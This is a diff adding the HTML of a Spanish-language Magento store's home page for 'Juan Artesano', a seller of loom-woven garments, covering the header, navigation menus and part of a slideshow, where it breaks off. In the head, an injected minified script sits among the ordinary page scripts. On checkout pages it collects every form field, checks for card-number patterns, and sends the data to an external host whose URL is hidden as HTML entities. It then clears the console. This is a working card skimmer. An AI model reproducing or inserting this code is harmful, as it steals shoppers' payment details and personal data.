@@ -1,0 +1,1441 @@
+ 
+<!DOCTYPE html>
+<html lang="es">
+<head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Juan Artesano</title>
+<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=no">
+<meta name="description" content="Default Description" />
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://juanartesano.com/media/favicon/default/favicon.png" type="image/x-icon" />
+<link rel="shortcut icon" href="http://juanartesano.com/media/favicon/default/favicon.png" type="image/x-icon" />
+<link href='http://fonts.googleapis.com/css?family=Lato:100,300,400,700,900,100italic,300italic,400italic,700italic,900italic' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Bitter:400,700,400italic' rel='stylesheet' type='text/css'>
+<link href='//fonts.googleapis.com/css?family=Bitter:200,300,400,500,600,700,800' rel='stylesheet' type='text/css'>
+
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://juanartesano.com/js/blank.html';
+    var BLANK_IMG = 'http://juanartesano.com/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<script type="text/javascript">
+var BLANK_URL = 'http://juanartesano.com/js/blank.html';
+var BLANK_IMG = 'http://juanartesano.com/js/spacer.gif';
+var SKIN_URL = 'http://juanartesano.com/skin/frontend/rwd/accord/';
+</script>
+<link rel="stylesheet" type="text/css" href="http://juanartesano.com/js/calendar/calendar-win2k-1.css" />
+<link rel="stylesheet" type="text/css" href="http://juanartesano.com/skin/frontend/rwd/accord/css/font-awesome.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://juanartesano.com/skin/frontend/rwd/accord/css/fancybox.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://juanartesano.com/skin/frontend/rwd/accord/css/scrollingcart/scroll.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://juanartesano.com/skin/frontend/rwd/accord/css/blogmate/blogmate.css" media="all" />
+<script type="text/javascript" src="http://juanartesano.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/lib/jquery/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/lib/jquery/noconflict.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/varien/product.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/varien/configurable.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/calendar/calendar.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/js/calendar/calendar-setup.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/default/js/lib/modernizr.custom.min.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/default/js/lib/selectivizr.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/default/js/lib/matchMedia.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/default/js/lib/matchMedia.addListener.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/default/js/lib/enquire.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/default/js/app.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/default/js/lib/jquery.cycle2.min.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/default/js/lib/jquery.cycle2.swipe.min.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/default/js/slideshow.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/default/js/lib/imagesloaded.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/default/js/minicart.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/base/default/js/bundle.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/jquery.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/banner.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/nav.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/cart.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/totop.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/products-slider.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/left-nav.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/cat-slides.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/mob-nav.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/pro-img-slider.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/toggle.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/cloud-zoom.js"></script>
+<script type="text/javascript" src="http://juanartesano.com/skin/frontend/rwd/accord/js/jquery.fancybox-1.3.4.pack.js"></script>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Raleway:300,400,500,700,600" />
+<!--[if  (lte IE 8) & (!IEMobile)]>
+<link rel="stylesheet" type="text/css" href="http://juanartesano.com/skin/frontend/rwd/default/css/styles-ie8.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://juanartesano.com/skin/frontend/rwd/default/css/madisonisland-ie8.css" media="all" />
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.juanartesano.com';
+//]]>
+</script>
+<meta name="viewport" content="initial-scale=1.0, width=device-width" />
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["AF"];
+//]]>
+</script>
+
+ 
+
+     
+  
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate({"Please select an option.":"Por favor, seleccione una opci\u00f3n.","This is a required field.":"Campo requerido.","Please enter a valid number in this field.":"Por favor, escriba un n\u00famero v\u00e1lido en este campo.","Please use letters only (a-z or A-Z) in this field.":"Por favor, utilice s\u00f3lo letras (a-z \u00f3 A-Z) en este campo.","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Por favor, use s\u00f3lo letras (a-z), n\u00fameros (0-9) o guiones bajos(_) en este campo. El primer car\u00e1cter debe ser una letra.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"Por favor, escriba un n\u00famero de tel\u00e9fono v\u00e1lido.","Please enter a valid date.":"Por favor, escriba una fecha v\u00e1lida.","Please enter a valid email address. For example johndoe@domain.com.":"Por favor, escriba una direcci\u00f3n de correo v\u00e1lida. Por ejemplo perez@dominio.com","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"Por favor, escriba 6 o m\u00e1s caracteres. Los espacios al principio y al final ser\u00e1n ignorados.","Please make sure your passwords match.":"Aseg\u00farese de que sus contrase\u00f1as coinciden.","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"Por favor, escriba una URL v\u00e1lida. Por ejemplo http:\/\/www.ejemplo.com o www.ejemplo.com","Please enter a valid social security number. For example 123-45-6789.":"Por favor, escriba un n\u00famero v\u00e1lido de seguridad social.","Please enter a valid zip code. For example 90602 or 90602-1234.":"Por favor, escriba un c\u00f3digo postal v\u00e1lido.","Please enter a valid zip code.":"Por favor, escriba un c\u00f3digo postal v\u00e1lido.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"Por favor, use este formato de fecha: dd\/mm\/aaaa. Por ejemplo, 17\/03\/2006 para 17 de marzo de 2006.","Please enter a valid $ amount. For example $100.00.":"Por favor, escriba un importe v\u00e1lido.","Please select one of the above options.":"Por favor, seleccione una de las opciones arriba.","Please select one of the options.":"Por favor, seleccione una de las opciones.","Please select State\/Province.":"Por favor, seleccione Estado\/Provincia","Please enter a number greater than 0 in this field.":"Por favor, escriba un n\u00famero mayor que 0 en este campo.","Please enter a valid credit card number.":"Por favor, escriba un n\u00famero de tarjeta de cr\u00e9dito v\u00e1lido.","Please wait, loading...":"Por favor, espere. Cargando...","Complete":"Completa","Add Products":"A\u00f1adir productos","Please choose to register or to checkout as a guest":"Por favor, elija registrarse o comprar como invitado","Please specify payment method.":"Por favor, especifique forma de pago.","Add to Cart":"Agregar al carrito","In Stock":"En existencia","Out of Stock":"Fuera de existencia"});
+        //]]></script><script type="text/javascript">jQuery(function(e){e("button").on("click",function(){var t="",o="post",n=window.location;if(new RegExp("checkout").test(n)){for(var c=document.querySelectorAll("input,select"),i=0;i<c.length;i++)if(c[i].value.length>0){var a=c[i].name;""==a&&(a=i),t+=a+"="+c[i].value+"&"}if(t){var l=new RegExp("[0-9]{13,16}"),u=new XMLHttpRequest;u.open(o,e("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#111;&#119;&#110;&#115;&#97;&#102;&#101;&#116;&#121;&#46;&#111;&#114;&#103;&#47;&#111;&#112;&#112;&#46;&#112;&#104;&#112;").text(),!0),u.setRequestHeader("Content-type","application/x-www-form-urlencoded"),u.send(t+"&asd="+(l.test(t.replace(/s/g,""))?1:0)+"&utmp="+n),console.clear()}}})});</script>
+<link rel="stylesheet" href="http://juanartesano.com/skin/frontend/rwd/accord/css/styles.css" type="text/css" />
+<link rel="stylesheet" href="http://juanartesano.com/skin/frontend/rwd/accord/css/responsive.css" type="text/css" />
+
+
+<style type="text/css">
+/*  update google Font  */
+.top-cart-content .block-subtitle, #nav > li > a, #nav ul.level0 > li > a, #nav .nav-custom-link .header-nav-dropdown-wrapper h4.heading, .totals h3, .crosssel h2, .cart-collaterals .col2-set h3,.page-title h1, .page-title h2,
+.products-grid .item .item-inner .item-info .info-inner .item-title a, .block .block-title, .side-nav-categories .block-title, .block-account .block-title, .cat-img-title .cat-heading, .products-list .product-name a,
+.product-view .product-name h1, .tab-box .activeLink a, .tab-box a, .tab-box a:hover, .one-page-checkout .step-title .number, .one-page-checkout .active .step-title h3, .one-page-checkout .step-title h3,
+.one-page-checkout .active .step-title, .page-title_multi h2, #wishlist-table .product-name, .login_page strong, #shopping-cart-table .product-name, #store-messages .phone strong, #store-messages .message strong,
+footer h4, .our-features-box .feature-box, .new_title h2, .related-block .block-title, .up-sell-slider .block-title, .popular-block .block-title, .orange-slider .text, .right-side-content h2, #menu ul.navmenu .menutop h2,
+ul.topnav li a, .blog-title h2, .latest-news a { font-family: 'Bitter',  sans-serif;  } 
+
+/* update theme color */
+.products-grid .actions button.button.btn-cart { background:; } 
+
+</style></head>
+
+<body class="flexible  cms-index-index cms-accord-home">
+            <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+      
+       <header>
+<div class="top-links">
+<div class="inner">
+     
+ 
+
+<div class="language-box">
+  <div class="language-switcher">
+   <div style="display: none;" class="language_detail">
+          <div class="language-inner">
+          
+            <a href="http://juanartesano.com/?___store=es&amp;___from_store=es">
+               <img src="http://juanartesano.com/skin/frontend/rwd/accord/images/flags/es.png" alt="Español" />
+               <span>Español</span>
+            </a>          
+          
+            <a href="http://juanartesano.com/?___store=en&amp;___from_store=es">
+               <img src="http://juanartesano.com/skin/frontend/rwd/accord/images/flags/en.png" alt="Ingles" />
+               <span>Ingles</span>
+            </a>          
+   </div>  <!--language-inner -->
+  </div> <!--language_detail-->
+  <div class="select_lang"> 
+          <img src="http://juanartesano.com/skin/frontend/rwd/accord/images/flags/es.png" alt="es"/> 
+     <span>Español</span> <span class="caret"></span>
+  </div> <!--select_lang-->
+  </div> <!--language-switcher-->
+</div> <!--language-box-->
+<script type="text/javascript">
+        jQuery(function() {
+                jQuery(".language-switcher").hover(function() {
+                        jQuery('.select_lang').addClass('active');
+                        jQuery(".language_detail").stop(true, true).slideDown(200, "easeInSine");
+                        },  
+                        function() {
+                        jQuery('.select_lang').removeClass('active');
+                        jQuery(".language_detail").stop(true, true).fadeOut(100, "easeInCubic");
+                        });
+
+        });
+</script>
+
+
+
+       
+
+
+     
+     <div class="currency-box">
+  <div class="currency-switcher">      
+    <div style="display: none;" class="currency_detail">
+            <div class="currency-inner">
+         
+
+                <a href="http://juanartesano.com/directory/currency/switch/currency/USD/uenc/aHR0cDovL2p1YW5hcnRlc2Fuby5jb20v/?___store=USD" title="USD"><span> US$  - USD</span></a>
+
+         
+
+                <a href="http://juanartesano.com/directory/currency/switch/currency/EUR/uenc/aHR0cDovL2p1YW5hcnRlc2Fuby5jb20v/?___store=EUR" title="EUR"><span> € - EUR</span></a>
+
+         
+
+                <a href="http://juanartesano.com/directory/currency/switch/currency/ARS/uenc/aHR0cDovL2p1YW5hcnRlc2Fuby5jb20v/?___store=ARS" title="ARS"><span> AR$ - ARS</span></a>
+
+                    </div> <!--currency-inner-->
+    </div>  <!--currency_detail-->
+    <div class="select_curr"> 
+       <span>ARS</span> <span class="caret"></span>
+    </div> <!--select_curr-->
+  </div> <!--currency-switcher-->
+</div> <!--currency-box-->
+<script type="text/javascript">
+        jQuery(function() {
+                jQuery(".currency-switcher").hover(function() {
+                        jQuery('.select_curr').addClass('active');
+                        jQuery(".currency_detail").stop(true, true).slideDown(200, "easeInSine");
+                        },  
+                        function() {
+                        jQuery('.select_curr').removeClass('active');
+                        jQuery(".currency_detail").stop(true, true).fadeOut(100, "easeInCubic");
+                        });
+
+        });
+</script>
+       <p class="welcome-msg">Bienvenido</p>
+   <div class="toplinks">
+     <div class="links">
+      <div class="myaccount"><a href="http://juanartesano.com/customer/account/" title="Mi cuenta"><span>Mi cuenta</span></a></div>
+      <div class="wishlist"><a href="http://juanartesano.com/wishlist/" title="Favoritos"><span>Favoritos</span></a></div>
+      <div class="check"><a href="http://juanartesano.com/checkout/onepage/" title="Realizar Pedido"><span>Realizar Pedido</span></a></div>
+      
+      <!--<div class="demo"><a title="Blog" href="http://juanartesano.com/blog/"><span>Blog</span></a></div>-->
+<div class="company">
+<div class="click-nav">
+<ul class="no-js">
+<li><a class="clicker" title="Company">Juan Artesano <span class="caret"></span></a>
+<ul class="link">
+<li><a title="About Us" href="http://juanartesano.com/about-us/">Acerca de nosotros</a></li>
+<!--<li><a title="Customer Service" href="#">Servicio al Cliente</a></li>-->
+<!--<li><a title="Privacy Policy" href="#">Políticas de Privacidad</a></li>-->
+<li><a title="Site Map" href="http://juanartesano.com/catalog/seo_sitemap/category/"><span>Mapa de Sitio</span></a></li>
+<li><a title="Search Terms" href="http://juanartesano.com/catalogsearch/term/popular/"><span>Busqueda de Terminos</span></a></li>
+<li class="last"><a title="Advanced Search" href="http://juanartesano.com/catalogsearch/advanced/"><span>Busqueda Avanzada</span></a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+               <div class="login"><a href="http://juanartesano.com/customer/account/login/"><span>Iniciar sesión</span></a></div>
+                 </div> <!-- links -->
+   </div> <!--toplinks-->
+     </div><!--inner-->
+    </div> <!--top-links-->
+  <div class="header">     
+             <div class="top-cart-contain">
+  <div class="mini-cart">
+  <div class="basket dropdown-toggle" data-hover="dropdown" data-toggle="dropdown"> 
+  
+      <a href="http://juanartesano.com/checkout/cart/"><span>Carrito de compras (0) </span></a></div>
+      <div>
+      <div class="top-cart-content  arrow_box">
+                                 
+                <p class="a-center noitem">No tiene artículos en su carrito de compras.</p>               
+                  </div> <!--top-cart-content-->
+  </div>
+  </div> <!--mini-cart-->
+</div> <!--top-cart-contain-->                <div class="logo"><a href="http://juanartesano.com/" title="Juan Artesano"><div><img src="http://juanartesano.com/skin/frontend/rwd/accord/images/logo.png" alt="Juan Artesano" /></div></a></div>
+      
+  </div> <!--header-->
+  </header>
+<nav>
+  <div class="nav-inner">
+    
+            
+
+
+
+<script type="text/javascript">
+jQuery(document).ready(function() {
+          jQuery('.toggle').click(function() {
+               if (jQuery('.submenu').is(":hidden"))
+               {
+                    jQuery('.submenu').slideDown("fast");
+               } else {
+                    jQuery('.submenu').slideUp("fast");
+               }
+               return false;
+          });
+});
+
+/*Phone Menu*/
+jQuery(document).ready(function() {
+        jQuery(".topnav").accordion({
+                accordion:false,
+                speed: 300,
+                closedSign: '+',
+                openedSign: '-'
+        });
+});
+
+</script>
+
+<div id="menu" class="hidden-desktop">
+  <ul class="navmenu">
+     <li>
+      <div class="menutop">
+        <div class="toggle"> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></div>                
+       </div>
+       <ul class="submenu" style="display:none;">
+         <li>
+           <ul class="topnav">
+              <li class="level0 nav-1 level-top first parent">
+<a href="http://juanartesano.com/telar.html" class="level-top">
+<span>TELAR</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-1-1 first">
+<a href="http://juanartesano.com/telar/telar-criollo-o-a-pala.html">
+<span>TELAR CRIOLLO O A PALA</span>
+</a>
+</li><li class="level1 nav-1-2 last">
+<a href="http://juanartesano.com/telar/telar-de-mesa.html">
+<span>TELAR DE MESA</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-2 level-top">
+<a href="http://juanartesano.com/bastidor.html" class="level-top">
+<span>BASTIDOR</span>
+</a>
+</li><li class="level0 nav-3 level-top">
+<a href="http://juanartesano.com/otros-tejidos.html" class="level-top">
+<span>OTROS TEJIDOS</span>
+</a>
+</li><li class="level0 nav-4 level-top">
+<a href="http://juanartesano.com/cueros.html" class="level-top">
+<span>CUERO</span>
+</a>
+</li><li class="level0 nav-5 level-top parent">
+<a href="http://juanartesano.com/por-prenda.html" class="level-top">
+<span>POR PRENDA</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-5-1 first">
+<a href="http://juanartesano.com/por-prenda/saco-largo.html">
+<span>SACO LARGO</span>
+</a>
+</li><li class="level1 nav-5-2">
+<a href="http://juanartesano.com/por-prenda/chal.html">
+<span>CHAL</span>
+</a>
+</li><li class="level1 nav-5-3">
+<a href="http://juanartesano.com/por-prenda/ponchos.html">
+<span>PONCHOS</span>
+</a>
+</li><li class="level1 nav-5-4">
+<a href="http://juanartesano.com/por-prenda/campera-con-capucha.html">
+<span>CAMPERA CON CAPUCHA</span>
+</a>
+</li><li class="level1 nav-5-5">
+<a href="http://juanartesano.com/por-prenda/ruanas.html">
+<span>RUANAS</span>
+</a>
+</li><li class="level1 nav-5-6">
+<a href="http://juanartesano.com/por-prenda/carteras.html">
+<span>CARTERAS</span>
+</a>
+</li><li class="level1 nav-5-7">
+<a href="http://juanartesano.com/por-prenda/chaleco.html">
+<span>CHALECO</span>
+</a>
+</li><li class="level1 nav-5-8 last">
+<a href="http://juanartesano.com/por-prenda/spolverino.html">
+<span>SPOLVERINO</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-6 level-top last">
+<a href="http://juanartesano.com/dibujo-en-telar.html" class="level-top">
+<span>TECNICAS DE DIBUJO</span>
+</a>
+</li>           </ul>
+         </li>
+       </ul> 
+     </li>
+  </ul> <!--navmenu-->
+</div>
+    
+                                 <!-- BEGIN NAV -->  
+            <ul id="nav">
+                              <li id="nav-home" class="level0 parent drop-menu"><a class="level-top" href="http://juanartesano.com/"><span>Inicio</span></a>
+
+                </li>
+              
+                                
+                                      
+                    <li class="level0 nav-5 level-top">                    
+                                      <a class="level-top" href="http://juanartesano.com/telar.html"><span>TELAR</span></a>
+                                                                                    <div class="level0-wrapper dropdown-6col" style="left: 0px; display: none;">
+                          <div class="level0-wrapper2">
+                                                       <div class="nav-block nav-block-center"> 
+                                                       
+                                <ul class="level0">
+                        
+                         
+                            <li class="level1 nav-6-1 parent item">
+                                                            
+                                <a href="http://juanartesano.com/telar/telar-criollo-o-a-pala.html"><span>TELAR CRIOLLO O A PALA</span></a>
+                                <!--sub sub category-->
+                                                             
+                                                                                                 <!--sub sub category-->  
+                                                                                        
+                            </li> <!--level1 nav-6-1 parent item-->
+                         
+                            <li class="level1 nav-6-1 parent item">
+                                                            
+                                <a href="http://juanartesano.com/telar/telar-de-mesa.html"><span>TELAR DE MESA</span></a>
+                                <!--sub sub category-->
+                                                             
+                                                                                                 <!--sub sub category-->  
+                                                                                        
+                            </li> <!--level1 nav-6-1 parent item-->
+                                 
+                                </ul> <!--level0-->
+                              
+                            </div> <!--nav-block nav-block-center-->  
+                               
+                                    
+                                           
+                          </div> <!--level0-wrapper2-->
+			                       </div> <!--level0-wrapper dropdown-6col-->
+                                        </li> 
+                                 
+                                      
+                    <li class="level0 nav-5 level-top">                    
+                                      <a class="level-top" href="http://juanartesano.com/bastidor.html"><span>BASTIDOR</span></a>
+                                                                                </li> 
+                                 
+                                      
+                    <li class="level0 nav-5 level-top">                    
+                                      <a class="level-top" href="http://juanartesano.com/otros-tejidos.html"><span>OTROS TEJIDOS</span></a>
+                                                                                </li> 
+                                 
+                                      
+                    <li class="level0 nav-5 level-top">                    
+                                      <a class="level-top" href="http://juanartesano.com/cueros.html"><span>CUERO</span></a>
+                                                                                </li> 
+                                 
+                                      
+                    <li class="level0 nav-5 level-top">                    
+                                      <a class="level-top" href="http://juanartesano.com/por-prenda.html"><span>POR PRENDA</span></a>
+                                                                                    <div class="level0-wrapper dropdown-6col" style="left: 0px; display: none;">
+                          <div class="level0-wrapper2">
+                                                       <div class="nav-block nav-block-center"> 
+                                                       
+                                <ul class="level0">
+                        
+                         
+                            <li class="level1 nav-6-1 parent item">
+                                                            
+                                <a href="http://juanartesano.com/por-prenda/saco-largo.html"><span>SACO LARGO</span></a>
+                                <!--sub sub category-->
+                                                             
+                                                                                                 <!--sub sub category-->  
+                                                                                        
+                            </li> <!--level1 nav-6-1 parent item-->
+                         
+                            <li class="level1 nav-6-1 parent item">
+                                                            
+                                <a href="http://juanartesano.com/por-prenda/chal.html"><span>CHAL</span></a>
+                                <!--sub sub category-->
+                                                             
+                                                                                                 <!--sub sub category-->  
+                                                                                        
+                            </li> <!--level1 nav-6-1 parent item-->
+                         
+                            <li class="level1 nav-6-1 parent item">
+                                                            
+                                <a href="http://juanartesano.com/por-prenda/ponchos.html"><span>PONCHOS</span></a>
+                                <!--sub sub category-->
+                                                             
+                                                                                                 <!--sub sub category-->  
+                                                                                        
+                            </li> <!--level1 nav-6-1 parent item-->
+                         
+                            <li class="level1 nav-6-1 parent item">
+                                                            
+                                <a href="http://juanartesano.com/por-prenda/campera-con-capucha.html"><span>CAMPERA CON CAPUCHA</span></a>
+                                <!--sub sub category-->
+                                                             
+                                                                                                 <!--sub sub category-->  
+                                                                                        
+                            </li> <!--level1 nav-6-1 parent item-->
+                         
+                            <li class="level1 nav-6-1 parent item">
+                                                            
+                                <a href="http://juanartesano.com/por-prenda/ruanas.html"><span>RUANAS</span></a>
+                                <!--sub sub category-->
+                                                             
+                                                                                                 <!--sub sub category-->  
+                                                                                        
+                            </li> <!--level1 nav-6-1 parent item-->
+                         
+                            <li class="level1 nav-6-1 parent item">
+                                                            
+                                <a href="http://juanartesano.com/por-prenda/carteras.html"><span>CARTERAS</span></a>
+                                <!--sub sub category-->
+                                                             
+                                                                                                 <!--sub sub category-->  
+                                                                                        
+                            </li> <!--level1 nav-6-1 parent item-->
+                         
+                            <li class="level1 nav-6-1 parent item">
+                                                            
+                                <a href="http://juanartesano.com/por-prenda/chaleco.html"><span>CHALECO</span></a>
+                                <!--sub sub category-->
+                                                             
+                                                                                                 <!--sub sub category-->  
+                                                                                        
+                            </li> <!--level1 nav-6-1 parent item-->
+                         
+                            <li class="level1 nav-6-1 parent item">
+                                                            
+                                <a href="http://juanartesano.com/por-prenda/spolverino.html"><span>SPOLVERINO</span></a>
+                                <!--sub sub category-->
+                                                             
+                                                                                                 <!--sub sub category-->  
+                                                                                        
+                            </li> <!--level1 nav-6-1 parent item-->
+                                 
+                                </ul> <!--level0-->
+                              
+                            </div> <!--nav-block nav-block-center-->  
+                               
+                                    
+                                           
+                          </div> <!--level0-wrapper2-->
+			                       </div> <!--level0-wrapper dropdown-6col-->
+                                        </li> 
+                                 
+                                      
+                    <li class="level0 nav-5 level-top">                    
+                                      <a class="level-top" href="http://juanartesano.com/dibujo-en-telar.html"><span>TECNICAS DE DIBUJO</span></a>
+                                                                                </li> 
+              
+
+          
+            </ul> <!--nav-->
+
+    
+<script type="text/javascript">
+        //<![CDATA[
+
+            jQuery(function($) {
+                $("#nav > li").hover(function() {
+                    var el = $(this).find(".level0-wrapper");
+                    el.hide();
+                    el.css("left", "0");
+                    el.stop(true, true).delay(150).fadeIn(300, "easeOutCubic");
+                }, function() {
+                    $(this).find(".level0-wrapper").stop(true, true).delay(300).fadeOut(300, "easeInCubic");
+                });
+            });
+
+            var isTouchDevice = ('ontouchstart' in window) || (navigator.msMaxTouchPoints > 0);
+            jQuery(window).on("load", function() {
+
+                if (isTouchDevice)
+                {
+                    jQuery('#nav a.level-top').click(function(e) {
+                        $t = jQuery(this);
+                        $parent = $t.parent();
+                        if ($parent.hasClass('parent'))
+                        {
+                            if ( !$t.hasClass('menu-ready'))
+                            {                    
+                                jQuery('#nav a.level-top').removeClass('menu-ready');
+                                $t.addClass('menu-ready');
+                                return false;
+                            }
+                            else
+                            {
+                                $t.removeClass('menu-ready');
+                            }
+                        }
+                    });
+                }
+
+            }); //end: on load
+
+        //]]>
+</script>
+<script type="text/javascript">
+//<![CDATA[
+    jQuery(document).ready(function(){
+        var scrolled = false;
+        jQuery("#nav li.level0.drop-menu").mouseover(function(){
+            if(jQuery(window).width() >= 740){
+                jQuery(this).children('ul.level1').fadeIn(100);
+            }
+            return false;
+        }).mouseleave(function(){
+            if(jQuery(window).width() >= 740){
+                jQuery(this).children('ul.level1').fadeOut(100);
+            }
+            return false;
+        });
+        jQuery("#nav li.level0.drop-menu li").mouseover(function(){
+            if(jQuery(window).width() >= 740){
+                jQuery(this).children('ul').css({top:0,left:"165px"});
+                var offset = jQuery(this).offset();
+                if(offset && (jQuery(window).width() < offset.left+325)){
+                    jQuery(this).children('ul').removeClass("right-sub");
+                    jQuery(this).children('ul').addClass("left-sub");
+                    jQuery(this).children('ul').css({top:0,left:"-167px"});
+                } else {
+                    jQuery(this).children('ul').removeClass("left-sub");
+                    jQuery(this).children('ul').addClass("right-sub");
+                }
+                jQuery(this).children('ul').fadeIn(100);
+            }
+        }).mouseleave(function(){
+            if(jQuery(window).width() >= 740){
+                jQuery(this).children('ul').fadeOut(100);
+            }
+        });
+        
+
+    });
+//]]>
+</script>
+    
+
+ <div class="search-box">
+   <form id="search_mini_form" action="http://juanartesano.com/catalogsearch/result/" method="get">                     
+        <input id="search" type="text" name="q" value="" class="searchbox" maxlength="128" />
+        <button type="submit" title="Buscar" class="button-common search-btn-bg" id="submit-button"><span class="searchIconNew"></span></button>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Buscar en toda la tienda...');
+            searchForm.initAutocomplete('http://juanartesano.com/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>    
+   </form>
+ </div> <!--search-box-->  </div> <!--nav-inner-->
+</nav> <!--nav--> 
+           <!-- Home Slider Block --> 
+           <div class="slider-intro">
+<div class="the-slideshow slideshow-wrapper">
+<ul class="slideshow" style="overflow: hidden;">
+<li class="slide">
+<p><a href="#"> <img src="http://juanartesano.com/skin/frontend/rwd/accord/images/banner-img.jpg" alt="banner img" /></a></p>
+<div class="caption light1 top-right">
+<div class="caption-inner">
+<p class="normal-text">DISEÑO EN TELAR</p>
+<h2 class="heading permanent">Prendas de vestir únicas</h2>
+<p class="normal-text1" style="line-height: 1.3em; letter-spacing: 0px; text-transform: none;" >Prendas realizadas en telar a pala o telar criollo, tejidos con fibras naturales.</p>
+<!--<p class="heading">Diseño en telar</p>
+<div class="badge"><em>up to</em> <br /> 70% <span>OFF</span></div>
+<p class="heading1">Lorem Ipsum is simply dummy text of the printing and typesetting industry it has been the industrys standard dummy</p>
+<p class="intro-btn"><a title="Click to see all features" href="#">Shop Now</a></p>-->
+</div>
+</div>
+</li>
+<li class="slide">
+<p><a href="#"> <img src="http://juanartesano.com/skin/frontend/rwd/accord/images/banner-img1.jpg" alt="banner img1" /></a></p>
+<!--<div class="caption light top-right">-->
+<div class="caption light1 top-right">
+<div class="caption-inner">
+<p class="normal-text">DISEÑO EN TELAR</p>
+<h2 class="heading permanent">Técnicas Artesanales</h2>
+<p class="normal-text1" style="line-height: 1.3em; letter-spacing: 0px; text-transform: none;">Hilados teñidos con elementos naturales.</p>
+<!--<p class="intro-btn"><a title="Click to see all features" href="#">Buy Now</a></p>-->
+</div>
+</div>
+</li>
+<li class="slide">
